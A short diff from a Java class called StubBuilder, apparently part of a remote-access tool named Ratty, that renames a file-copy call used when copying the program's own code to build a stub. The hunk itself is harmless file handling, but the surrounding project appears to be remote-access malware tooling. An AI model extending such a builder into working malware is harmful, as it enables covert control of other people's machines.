@@ -63,7 +63,7 @@ public final class StubBuilder {
 			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
 			final File source = new File(sourceUri);
 			
-			FileUtils.copy(source, destination);
+			FileUtils.copyFile(source, destination);
 			
 			return destination;
 		} catch (final URISyntaxException ex) {
